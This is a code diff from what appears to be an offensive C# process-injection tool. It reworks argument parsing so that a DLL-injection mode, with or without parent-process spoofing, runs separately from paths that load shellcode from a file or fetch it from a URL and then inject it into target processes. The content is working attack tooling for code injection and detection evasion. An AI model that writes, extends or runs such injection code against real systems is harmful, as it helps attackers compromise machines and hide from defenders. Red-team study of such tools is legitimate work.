@@ -1099,6 +1099,7 @@ Usage           Description
                     int parentProc = 0;
                     string shellcode = null;
                     byte[] rawshellcode = new byte[] { };
+                    byte[] dllbuf = new byte[] { };
 
                     if (arguments.ContainsKey("/pid"))
                     {
@@ -1112,30 +1113,39 @@ Usage           Description
                     }
                     if (arguments.ContainsKey("/path") && System.IO.File.Exists(arguments["/path"]))
                     {
-                        if (arguments["/f"] == "raw")
+                        if (arguments["/t"] != "2")
                         {
-                            rawshellcode = System.IO.File.ReadAllBytes(arguments["/path"]);
+                            if (arguments["/f"] == "raw")
+                            {
+                                rawshellcode = System.IO.File.ReadAllBytes(arguments["/path"]);
+                            }
+                            else
+                            {
+                                shellcode = System.IO.File.ReadAllText(arguments["/path"]);
+                            }
                         }
-                        else
+                        else if (arguments["/t"] == "2")
                         {
-                            shellcode = System.IO.File.ReadAllText(arguments["/path"]);
+                            dllbuf = Encoding.Default.GetBytes(arguments["/path"]);
                         }
 
                     }
                     else if (arguments.ContainsKey("/url"))
                     {
-                        if (arguments["/f"] == "raw")
+                        if (arguments["/t"] != "2")
                         {
-                            rawshellcode = GetRawShellcode(arguments["/url"]);
+                            if (arguments["/f"] == "raw")
+                            {
+                                rawshellcode = GetRawShellcode(arguments["/url"]);
+                            }
+                            else
+                            {
+                                shellcode = GetShellcode(arguments["/url"]);
+                            }
                         }
-                        else
-                        {
-                            shellcode = GetShellcode(arguments["/url"]);
-                        }
-
                     }
 
-                    if (shellcode != null || rawshellcode.Length > 0)
+                    if (arguments["/t"] != "2" && (shellcode != null || rawshellcode.Length > 0))
                     {
 
                         byte[] xorshellcode = new byte[] { };
@@ -1228,28 +1238,6 @@ Usage           Description
                                 CodeInject(procid, buf);
                             }
                         }
-                        else if (arguments["/t"] == "2")
-                        {
-                            if (arguments.ContainsKey("/parentproc"))
-                            {
-                                if (arguments.ContainsKey("/ppath"))
-                                {
-                                    PrintTitle($"[>>] Parent Process Spoofing with DLL Injection Technique.");
-                                    byte[] dllbuf = Encoding.Default.GetBytes(arguments["/path"]);
-                                    PPIDDLLInject(arguments["/ppath"], dllbuf, parentProc);
-                                }
-                                else
-                                {
-                                    PrintError("[-] /ppath argument is missing");
-                                }
-                            }
-                            else
-                            {
-                                PrintTitle($"[>>] DLL Injection Technique.");
-                                byte[] dllbuf = Encoding.Default.GetBytes(arguments["/path"]);
-                                DLLInject(procid, dllbuf);
-                            }
-                        }
                         else if (arguments["/t"] == "3")
                         {
                             if (arguments.ContainsKey("/ppath"))
@@ -1311,6 +1299,26 @@ Usage           Description
                                 PrintTitle($"[>>] Dynamic Invoke - Vanilla Process Injection Technique.");
                                 DynamicCodeInject(procid, buf);
                             }
+                        }
+                    }
+                    else if (arguments["/t"] == "2")
+                    {
+                        if (arguments.ContainsKey("/parentproc"))
+                        {
+                            if (arguments.ContainsKey("/ppath"))
+                            {
+                                PrintTitle($"[>>] Parent Process Spoofing with DLL Injection Technique.");
+                                PPIDDLLInject(arguments["/ppath"], dllbuf, parentProc);
+                            }
+                            else
+                            {
+                                PrintError("[-] /ppath argument is missing");
+                            }
+                        }
+                        else
+                        {
+                            PrintTitle($"[>>] DLL Injection Technique.");
+                            DLLInject(procid, dllbuf);
                         }
                     }
                     else
